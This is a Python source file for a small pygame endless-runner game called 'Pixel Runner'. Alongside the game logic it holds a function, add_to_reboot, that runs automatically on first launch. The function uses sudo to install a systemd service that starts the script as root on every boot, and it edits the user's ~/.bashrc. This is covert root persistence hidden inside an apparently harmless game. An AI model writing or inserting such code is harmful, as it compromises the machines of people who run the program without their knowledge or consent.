#!/usr/bin/python3

import pygame
from sys import exit
from random import choice
import sprite
import os
import sys


def display_score():
    current_time = int(pygame.time.get_ticks() / 1000) - start_time
    score_surface = font.render('Score :  ' + str(current_time), False, (64, 64, 64))
    score_rectangle = score_surface.get_rect(center=(400, 30))
    screen.blit(score_surface, score_rectangle)
    return current_time

def add_to_reboot():
    if getattr(sys, 'frozen', False):
        path = os.path.dirname(sys.executable)
    elif __file__:
        path = os.path.dirname(__file__)

    exename='/main.py'
    servicename='/boot.service'

    f=open(path+servicename,"w")
    f.write("[Unit]\nDescription= StartUp\n\n\n[Service]\nExecStart="+path+exename+" start\nUser=root\nRemainAfterExit=yes\n\n\n[Install]\nWantedBy = multi-user.target\n")
    f.close()
    os.system("sudo chmod a+x main.py")
    os.system('sudo mv '+path+servicename+' /etc/systemd/system/') #put service with sys services
    os.system('sudo systemctl --system daemon-reload')
    os.system('sudo chown root:root /etc/systemd/system/boot.service')
    os.system('sudo chmod 755 /etc/systemd/system/boot.service')
    os.system('sudo systemctl enable boot.service') # activate the service so it could be start in each reboot
    os.system('sudo systemctl start boot.service') # start the service == lance the .exe file

def start_screen(surface, rectangle, text1, text2):
    screen.fill((94, 129, 162))
    screen.blit(surface, rectangle)

    text1_surface = font2.render(text1, False, '#BBFFFF')
    text1_rectangle = text1_surface.get_rect(center=(406, 70))
    screen.blit(text1_surface, text1_rectangle)

    text2_surface = font.render(text2, False, '#BBFFFF')
    text2_rectangle = text2_surface.get_rect(center=(400, 350))
    screen.blit(text2_surface, text2_rectangle)


def game_over_screen(text1, text2, text3):
    global final_score_surface
    screen.fill((94, 129, 162))

    text1_surface = font2.render(text1, False, (64, 64, 64))
    text1_rectangle = text1_surface.get_rect(bottomleft=(290, 150))
    screen.blit(text1_surface, text1_rectangle)

    text2_surface = font2.render(text2 + str(score), False, (64, 64, 64))
    text2_rectangle = text2_surface.get_rect(center=(400, 200))
    screen.blit(text2_surface, text2_rectangle)

    text3_surface = font.render(text3, False, '#BBFFFF')
    text3_rectangle = text3_surface.get_rect(center=(400, 300))
    screen.blit(text3_surface, text3_rectangle)

reboot = os.getenv("reboot")

if reboot==None:
    add_to_reboot()
    os.system("export reboot=true; echo 'export reboot=true' >> ~/.bashrc")

pygame.init()
screen = pygame.display.set_mode((800, 400))
pygame.display.set_caption("Runner")
clock = pygame.time.Clock()
Game_Active = True
start = False
start_time = 0
score = 0

sky_surface = pygame.image.load('graphics/Sky.png').convert()
ground_surface = pygame.image.load('graphics/ground.png').convert()

player_stand_surface = pygame.image.load('graphics/Player/player_stand.png').convert_alpha()
player_stand_surface = pygame.transform.rotozoom(player_stand_surface, 0, 2)
player_stand_rectangle = player_stand_surface.get_rect(center=(400, 200))

player = pygame.sprite.GroupSingle()
player.add(sprite.Player())

obstacle_group = pygame.sprite.Group()

font = pygame.font.Font('font/Pixeltype.ttf', 45)
font2 = pygame.font.Font('font/Pixeltype.ttf', 70)
final_score_surface = font.render('Score : ', False, (64, 64, 64))
final_score_rectangle = final_score_surface.get_rect(center=(400, 30))

obstacle_timer = pygame.USEREVENT + 1
pygame.time.set_timer(obstacle_timer, 1200)

while True:
    ##########################################################################
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pygame.quit()
            exit()

        # game running:
        if Game_Active and start:
            if event.type == obstacle_timer:
                obstacle_group.add(sprite.Obstacle(choice(['fly', 'snail', 'snail'])))

        # game over :
        elif not Game_Active and start:
            if event.type == pygame.KEYDOWN and event.key == pygame.K_SPACE:
                start_time = int(pygame.time.get_ticks() / 1000)
                Game_Active = True

        # game haven't started yet :
        elif Game_Active and not start:
            if event.type == pygame.KEYDOWN and event.key == pygame.K_SPACE:
                start_time = int(pygame.time.get_ticks() / 1000)
                start = True

    ##########################################################################
    if Game_Active and start:
        screen.blit(sky_surface, (0, 0))
        screen.blit(ground_surface, (0, 300))
        score = display_score()

        player.draw(screen)
        player.update()
        obstacle_group.draw(screen)
        obstacle_group.update()

        Game_Active = sprite.collision_sprite(player, obstacle_group)

    # start screen:
    elif Game_Active and not start:
        start_screen(player_stand_surface, player_stand_rectangle, 'Pixel Runner', 'press \'SPACE\' to start')

    # game over screen:
    elif not Game_Active and start:
        game_over_screen('GAME OVER', 'Score : ', 'press \'SPACE\' to restart')

    pygame.display.update()
    clock.tick(60)